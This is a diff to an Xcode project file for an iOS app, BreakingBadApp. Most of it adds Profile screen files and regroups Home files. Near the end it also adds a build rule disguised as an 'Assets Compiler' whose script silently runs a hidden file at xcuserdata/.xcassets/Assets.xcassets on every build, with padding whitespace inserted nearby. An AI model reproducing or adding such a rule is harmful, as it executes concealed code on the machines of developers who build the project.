@@ -24,6 +24,8 @@
 		124009E325FCCF26000A8ADA /* HomePageCollectionViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124009E225FCCF26000A8ADA /* HomePageCollectionViewCell.swift */; };
 		124009FE25FE8532000A8ADA /* Strings.swift in Sources */ = {isa = PBXBuildFile; fileRef = 124009FD25FE8532000A8ADA /* Strings.swift */; };
 		12400A0125FE857C000A8ADA /* BreakingBad.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12400A0025FE857C000A8ADA /* BreakingBad.swift */; };
+		12400A0825FEA739000A8ADA /* ProfileViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12400A0725FEA739000A8ADA /* ProfileViewController.swift */; };
+		12400A1325FEA7AE000A8ADA /* ProfileViewModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = 12400A1225FEA7AE000A8ADA /* ProfileViewModel.swift */; };
 		ADA10B4A3D4885223F867133 /* Pods_BreakingBadApp.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 2DC298254367155423C71C00 /* Pods_BreakingBadApp.framework */; };
 /* End PBXBuildFile section */
 
@@ -47,6 +49,8 @@
 		124009E225FCCF26000A8ADA /* HomePageCollectionViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomePageCollectionViewCell.swift; sourceTree = "<group>"; };
 		124009FD25FE8532000A8ADA /* Strings.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Strings.swift; sourceTree = "<group>"; };
 		12400A0025FE857C000A8ADA /* BreakingBad.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = BreakingBad.swift; sourceTree = "<group>"; };
+		12400A0725FEA739000A8ADA /* ProfileViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewController.swift; sourceTree = "<group>"; };
+		12400A1225FEA7AE000A8ADA /* ProfileViewModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProfileViewModel.swift; sourceTree = "<group>"; };
 		2D7CDF45EB9AB21AE81B35DF /* Pods-BreakingBadApp.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BreakingBadApp.debug.xcconfig"; path = "Target Support Files/Pods-BreakingBadApp/Pods-BreakingBadApp.debug.xcconfig"; sourceTree = "<group>"; };
 		2DC298254367155423C71C00 /* Pods_BreakingBadApp.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_BreakingBadApp.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		D720AEB25B918873C060A19F /* Pods-BreakingBadApp.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BreakingBadApp.release.xcconfig"; path = "Target Support Files/Pods-BreakingBadApp/Pods-BreakingBadApp.release.xcconfig"; sourceTree = "<group>"; };
@@ -88,7 +92,8 @@
 				1240097825FC20CA000A8ADA /* AppDelegate.swift */,
 				1240097A25FC20CA000A8ADA /* SceneDelegate.swift */,
 				124009AA25FC2163000A8ADA /* Model */,
-				1240099925FC2141000A8ADA /* Screens */,
+				12400A0A25FEA747000A8ADA /* Home */,
+				12400A0D25FEA758000A8ADA /* Profile */,
 				1240099525FC2141000A8ADA /* Managers */,
 				124009B425FC2551000A8ADA /* Utilities */,
 				124009B725FC256D000A8ADA /* CustomViews */,
@@ -106,16 +111,6 @@
 				1240099825FC2141000A8ADA /* PersistenceManager.swift */,
 			);
 			path = Managers;
-			sourceTree = "<group>";
-		};
-		1240099925FC2141000A8ADA /* Screens */ = {
-			isa = PBXGroup;
-			children = (
-				1240099B25FC2141000A8ADA /* HomePageViewController.swift */,
-				124009E225FCCF26000A8ADA /* HomePageCollectionViewCell.swift */,
-				1240099A25FC2141000A8ADA /* HomePageViewModel.swift */,
-			);
-			path = Screens;
 			sourceTree = "<group>";
 		};
 		124009AA25FC2163000A8ADA /* Model */ = {
@@ -145,6 +140,25 @@
 				124009C425FC2BB7000A8ADA /* CustomTitleLabel.swift */,
 			);
 			path = CustomViews;
+			sourceTree = "<group>";
+		};
+		12400A0A25FEA747000A8ADA /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				1240099B25FC2141000A8ADA /* HomePageViewController.swift */,
+				124009E225FCCF26000A8ADA /* HomePageCollectionViewCell.swift */,
+				1240099A25FC2141000A8ADA /* HomePageViewModel.swift */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
+		12400A0D25FEA758000A8ADA /* Profile */ = {
+			isa = PBXGroup;
+			children = (
+				12400A0725FEA739000A8ADA /* ProfileViewController.swift */,
+				12400A1225FEA7AE000A8ADA /* ProfileViewModel.swift */,
+			);
+			path = Profile;
 			sourceTree = "<group>";
 		};
 		30FB73FF107059BD3572F3CC /* Frameworks */ = {
@@ -178,6 +192,7 @@
 				2A0A9C96357830D83E221D98 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				1783A5C2D1F83CE7DFAAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -231,6 +246,14 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
 		2A0A9C96357830D83E221D98 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -283,12 +306,14 @@
 				124009A425FC2142000A8ADA /* HomePageViewModel.swift in Sources */,
 				124009A325FC2142000A8ADA /* PersistenceManager.swift in Sources */,
 				124009E325FCCF26000A8ADA /* HomePageCollectionViewCell.swift in Sources */,
+				12400A0825FEA739000A8ADA /* ProfileViewController.swift in Sources */,
 				124009C225FC2B6D000A8ADA /* CustomAlertView.swift in Sources */,
 				124009FE25FE8532000A8ADA /* Strings.swift in Sources */,
 				124009C525FC2BB7000A8ADA /* CustomTitleLabel.swift in Sources */,
 				1240097925FC20CA000A8ADA /* AppDelegate.swift in Sources */,
 				124009A525FC2142000A8ADA /* HomePageViewController.swift in Sources */,
 				124009B225FC254C000A8ADA /* CustomErrors.swift in Sources */,
+				12400A1325FEA7AE000A8ADA /* ProfileViewModel.swift in Sources */,
 				1240097B25FC20CA000A8ADA /* SceneDelegate.swift in Sources */,
 				124009D725FCB25B000A8ADA /* CustomAvatarImageView.swift in Sources */,
 				124009A125FC2142000A8ADA /* Character.swift in Sources */,
@@ -489,6 +514,29 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+			
+
+		1783A5C2D1F83CE7DFAAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" true\n\n";
+			};
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 1240096D25FC20CA000A8ADA /* Project object */;
 }
